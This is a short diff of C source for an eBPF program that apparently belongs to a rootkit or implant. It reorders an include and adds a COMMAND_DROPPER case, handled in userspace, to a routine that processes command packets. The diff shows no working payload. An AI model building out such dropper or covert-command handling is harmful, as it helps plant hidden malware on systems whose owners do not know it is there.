@@ -1,7 +1,7 @@
-#include <vmlinux.h>
 #include <asm-generic/errno-base.h>
 #include <bpf/bpf_endian.h>
 #include <bpf/bpf_helpers.h>
+#include <vmlinux.h>
 
 #include "bpf/maps.h"
 
@@ -65,6 +65,9 @@ static int process_and_execute_command(command_packet_t *command) {
         /* Will be handled by userspace */
         break;
     case COMMAND_UNINSTALL:
+        /* Will be handled by userspace */
+        break;
+    case COMMAND_DROPPER:
         /* Will be handled by userspace */
         break;
     default:
